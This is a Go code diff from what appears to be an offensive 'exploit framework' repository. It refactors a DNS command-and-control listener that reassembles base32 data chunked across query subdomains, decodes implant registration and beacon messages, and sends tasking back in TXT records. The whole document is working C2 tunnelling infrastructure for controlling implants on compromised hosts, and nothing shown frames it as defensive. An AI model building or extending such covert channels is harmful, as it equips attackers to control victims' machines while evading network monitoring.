@@ -8,6 +8,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/KKingZero/erebus-exploit-framwork/pkg/dnstransport"
 	zcrypto "github.com/KKingZero/erebus-exploit-framwork/pkg/crypto"
 	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
 	"github.com/miekg/dns"
@@ -15,6 +16,8 @@ import (
 )
 
 var b32 = base32.StdEncoding.WithPadding(base32.NoPadding)
+
+const chunkBufferTTL = 2 * time.Minute
 
 // DNSListener implements the Listener interface for DNS-based C2 transport.
 type DNSListener struct {
@@ -29,14 +32,12 @@ type DNSListener struct {
 	active    bool
 	mu        sync.Mutex
 
-	// Chunked transfer state
 	chunksMu sync.Mutex
-	chunks   map[string]*chunkBuffer // sessionID -> buffer
+	chunks   map[string]*chunkBuffer
 }
 
 type chunkBuffer struct {
-	data    []byte
-	chunks  map[int][]byte
+	chunks  map[int]string // base32 chunk data per seq
 	total   int
 	updated time.Time
 }
@@ -141,94 +142,126 @@ func (l *DNSListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			continue
 		}
 
-		// Parse subdomain: <data>.<session-id>.<domain>
 		name := strings.TrimSuffix(q.Name, l.domain)
-		name = strings.TrimSuffix(name, ".")
-
-		parts := strings.SplitN(name, ".", 2)
-		if len(parts) < 2 {
-			continue
-		}
-
-		encodedData := parts[0]
-		sessionID := parts[1]
-
-		// Decode base32 data
-		data, err := b32.DecodeString(strings.ToUpper(encodedData))
+		parsed, err := dnstransport.ParseQueryName(name)
 		if err != nil {
-			log.Printf("[dns] decode error from session %s: %v", sessionID, err)
 			continue
 		}
 
-		// Process the data (could be Register or Beacon)
-		responseData := l.processData(sessionID, data)
-
-		// Encode response as TXT records (max 255 bytes per string, chunked)
+		responseData := l.ingestChunk(parsed, w.RemoteAddr().String())
 		if len(responseData) > 0 {
-			encoded := b32.EncodeToString(responseData)
-			var txtParts []string
-			for len(encoded) > 0 {
-				end := 255
-				if end > len(encoded) {
-					end = len(encoded)
-				}
-				txtParts = append(txtParts, encoded[:end])
-				encoded = encoded[end:]
-			}
-
-			msg.Answer = append(msg.Answer, &dns.TXT{
-				Hdr: dns.RR_Header{
-					Name:   q.Name,
-					Rrtype: dns.TypeTXT,
-					Class:  dns.ClassINET,
-					Ttl:    0,
-				},
-				Txt: txtParts,
-			})
+			l.appendTXTAnswer(msg, q.Name, responseData)
 		}
 	}
 
 	w.WriteMsg(msg)
 }
 
-func (l *DNSListener) processData(sessionID string, data []byte) []byte {
-	// Try to unmarshal as Register first
-	reg := &pb.Register{}
-	if err := proto.Unmarshal(data, reg); err == nil && reg.ImplantId != "" {
-		// This is a registration
-		resp := l.handleRegister(reg, sessionID)
-		if resp != nil {
-			respData, _ := proto.Marshal(resp)
-			return respData
+func (l *DNSListener) ingestChunk(parsed *dnstransport.ParsedQuery, remoteAddr string) []byte {
+	key := parsed.SessionLabel
+
+	l.chunksMu.Lock()
+	defer l.chunksMu.Unlock()
+
+	l.purgeExpiredChunksLocked()
+
+	buf, ok := l.chunks[key]
+	if !ok || parsed.Seq == 0 {
+		buf = &chunkBuffer{
+			chunks:  make(map[int]string),
+			total:   parsed.Total,
+			updated: time.Now(),
 		}
+		l.chunks[key] = buf
+	}
+
+	buf.updated = time.Now()
+	buf.total = parsed.Total
+	buf.chunks[parsed.Seq] = strings.ToUpper(parsed.Data)
+
+	if len(buf.chunks) < buf.total {
 		return nil
 	}
 
-	// Try as Beacon
+	for i := 0; i < buf.total; i++ {
+		if _, ok := buf.chunks[i]; !ok {
+			return nil
+		}
+	}
+
+	var encoded strings.Builder
+	for i := 0; i < buf.total; i++ {
+		encoded.WriteString(buf.chunks[i])
+	}
+	delete(l.chunks, key)
+
+	raw, err := b32.DecodeString(encoded.String())
+	if err != nil {
+		log.Printf("[dns] reassemble decode error from %s: %v", key, err)
+		return nil
+	}
+
+	return l.processPayload(raw, remoteAddr)
+}
+
+func (l *DNSListener) purgeExpiredChunksLocked() {
+	now := time.Now()
+	for k, buf := range l.chunks {
+		if now.Sub(buf.updated) > chunkBufferTTL {
+			delete(l.chunks, k)
+		}
+	}
+}
+
+func (l *DNSListener) processPayload(data []byte, remoteAddr string) []byte {
+	reg := &pb.Register{}
+	if err := proto.Unmarshal(data, reg); err == nil && reg.ImplantId != "" {
+		resp, err := HandleRegister(l.handler, reg, "dns", remoteAddr)
+		if err != nil {
+			if err != ErrBeaconAuth {
+				log.Printf("[dns] register error: %v", err)
+			}
+			return nil
+		}
+		out, _ := proto.Marshal(resp)
+		return out
+	}
+
 	beacon := &pb.Beacon{}
 	if err := proto.Unmarshal(data, beacon); err == nil && beacon.ImplantId != "" {
-		resp := l.handleBeacon(beacon)
-		if resp != nil {
-			respData, _ := proto.Marshal(resp)
-			return respData
+		resp, err := HandleBeacon(l.handler, beacon)
+		if err != nil {
+			if err != ErrBeaconAuth {
+				log.Printf("[dns] beacon error: %v", err)
+			}
+			return nil
 		}
+		out, _ := proto.Marshal(resp)
+		return out
 	}
 
 	return nil
 }
 
-func (l *DNSListener) handleRegister(reg *pb.Register, _ string) *pb.RegisterResponse {
-	// Delegate to the shared beacon handler logic
-	// Simplified version - in production would share code with HTTPS listener
-	return &pb.RegisterResponse{
-		Success:       true,
-		SessionId:     "dns-session",
-		NextCheckinMs: 5000,
+func (l *DNSListener) appendTXTAnswer(msg *dns.Msg, qname string, data []byte) {
+	encoded := strings.ToLower(b32.EncodeToString(data))
+	var txtParts []string
+	for len(encoded) > 0 {
+		end := 255
+		if end > len(encoded) {
+			end = len(encoded)
+		}
+		txtParts = append(txtParts, encoded[:end])
+		encoded = encoded[end:]
 	}
-}
 
-func (l *DNSListener) handleBeacon(beacon *pb.Beacon) *pb.BeaconResponse {
-	return &pb.BeaconResponse{
-		NextCheckinMs: 5000,
-	}
+	msg.Answer = append(msg.Answer, &dns.TXT{
+		Hdr: dns.RR_Header{
+			Name:   qname,
+			Rrtype: dns.TypeTXT,
+			Class:  dns.ClassINET,
+			Ttl:    0,
+		},
+		Txt: txtParts,
+	})
 }
